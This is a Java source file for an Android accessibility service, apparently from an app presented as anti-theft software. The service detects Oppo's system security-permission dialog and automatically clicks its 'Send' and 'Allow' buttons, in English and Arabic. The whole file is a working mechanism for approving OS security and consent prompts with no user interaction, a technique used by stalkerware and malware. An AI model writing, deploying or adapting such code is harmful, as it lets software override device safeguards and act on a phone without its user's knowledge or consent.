package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;
import java.util.List;

public class AutoConfirmService extends AccessibilityService {

    private String lastPackageName = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        CharSequence packageNameSeq = event.getPackageName();
        String currentPackage = "";
        if (packageNameSeq != null) {
            currentPackage = packageNameSeq.toString();
        }

        // ONLY allow clicking on the specific Oppo security package or our own app
        if (!currentPackage.equals("com.oplus.securitypermission") && !currentPackage.equals("com.antitheft.droidguard")) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        boolean clicked = clickButtonByText(root, "إرسال") || 
                          clickButtonByText(root, "Send") || 
                          clickButtonByText(root, "السماح") || 
                          clickButtonByText(root, "Allow");

        if (clicked) {
            // Optional: log success or perform other actions
        }

        root.recycle();
    }

    private boolean clickButtonByText(AccessibilityNodeInfo root, String text) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                } else {
                    AccessibilityNodeInfo parent = node.getParent();
                    while (parent != null) {
                        if (parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            parent.recycle();
                            return true;
                        }
                        AccessibilityNodeInfo oldParent = parent;
                        parent = parent.getParent();
                        oldParent.recycle();
                    }
                }
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {}
}
